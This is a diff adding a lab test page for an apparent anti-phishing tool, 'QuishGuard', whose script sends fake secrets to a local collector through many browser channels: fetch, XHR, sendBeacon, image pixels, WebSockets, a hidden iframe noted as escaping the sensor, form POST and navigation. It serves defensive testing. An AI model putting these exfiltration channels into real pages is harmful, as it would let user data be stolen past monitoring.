@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>QuishGuard channel test (lab)</title>
+<style>button{display:block;width:100%;padding:16px;margin:6px 0;font-size:16px}</style>
+</head>
+<body>
+<h2>QuishGuard channel test</h2>
+<p style="color:#a00">LAB ONLY. Fake secrets only. Fires each send channel so we can see which
+defence layer observes (and later blocks) it.</p>
+
+<button id="all-same">Run all non-navigating - SAME origin</button>
+<button id="all-cross">Run all non-navigating - CROSS origin</button>
+<hr>
+<button id="form-same">Form POST (navigates) - SAME</button>
+<button id="form-cross">Form POST (navigates) - CROSS</button>
+<button id="nav-same">Navigation w/ query (navigates) - SAME</button>
+<button id="nav-cross">Navigation w/ query (navigates) - CROSS</button>
+
+<script>
+const SAME  = location.origin;              // http://10.0.2.2:8003
+const CROSS = "http://10.0.2.2:8002";       // a different origin (collector)
+const WSAME  = SAME.replace("http", "ws");
+const WCROSS = "ws://10.0.2.2:8004";
+const T = "[qg-test]";
+const base  = tag => tag === "same" ? SAME  : CROSS;
+const wbase = tag => tag === "same" ? WSAME : WCROSS;
+const secret = (ch, tag) => "S-" + ch + "-" + tag;
+const mark = (ch, tag) => console.log(T + " fire channel=" + ch + " origin=" + tag);
+const wait = ms => new Promise(r => setTimeout(r, ms));
+
+function doFetch(tag){ mark("fetch", tag);
+  fetch(base(tag)+"/collect?ch=fetch-"+tag, {method:"POST", body:"secret="+secret("fetch",tag)}).catch(()=>{}); }
+function doXhr(tag){ mark("xhr", tag);
+  const x=new XMLHttpRequest(); x.open("POST", base(tag)+"/collect?ch=xhr-"+tag); x.send("secret="+secret("xhr",tag)); }
+function doBeacon(tag){ mark("beacon", tag);
+  navigator.sendBeacon(base(tag)+"/collect?ch=beacon-"+tag, "secret="+secret("beacon",tag)); }
+function doImage(tag){ mark("image", tag);
+  new Image().src = base(tag)+"/pixel?ch=image-"+tag+"&secret="+secret("image",tag); }
+function doWs(tag){ mark("ws", tag);
+  try { const ws=new WebSocket(wbase(tag)+"/?ch=ws-"+tag);
+        ws.onopen=()=>{ ws.send("secret="+secret("ws",tag)); ws.close(); }; } catch(e){} }
+function doIframeFetch(tag){ mark("iframe-fetch", tag);
+  const f=document.createElement("iframe"); f.style.display="none";
+  f.onload=()=>{ try { f.contentWindow.fetch(base(tag)+"/collect?ch=iframe-"+tag,
+      {method:"POST", body:"secret="+secret("iframe",tag)}).catch(()=>{}); } catch(e){} };
+  f.src="about:blank"; document.body.appendChild(f); }   // about:blank frame: our sensor is NOT injected there
+
+async function runAll(tag){
+  doFetch(tag);        await wait(250);
+  doXhr(tag);          await wait(250);
+  doBeacon(tag);       await wait(250);
+  doImage(tag);        await wait(250);
+  doWs(tag);           await wait(400);
+  doIframeFetch(tag);
+}
+
+function doFormNav(tag){ mark("form-nav", tag);
+  const form=document.createElement("form"); form.method="POST"; form.action=base(tag)+"/login?ch=form-"+tag;
+  const i=document.createElement("input"); i.name="secret"; i.value=secret("form",tag);
+  form.appendChild(i); document.body.appendChild(form); form.submit(); }
+function doLocNav(tag){ mark("nav", tag);
+  location.href = base(tag)+"/go?ch=nav-"+tag+"&secret="+secret("nav",tag); }
+
+document.getElementById("all-same").onclick   = () => runAll("same");
+document.getElementById("all-cross").onclick  = () => runAll("cross");
+document.getElementById("form-same").onclick  = () => doFormNav("same");
+document.getElementById("form-cross").onclick = () => doFormNav("cross");
+document.getElementById("nav-same").onclick   = () => doLocNav("same");
+document.getElementById("nav-cross").onclick  = () => doLocNav("cross");
+</script>
+</body></html>
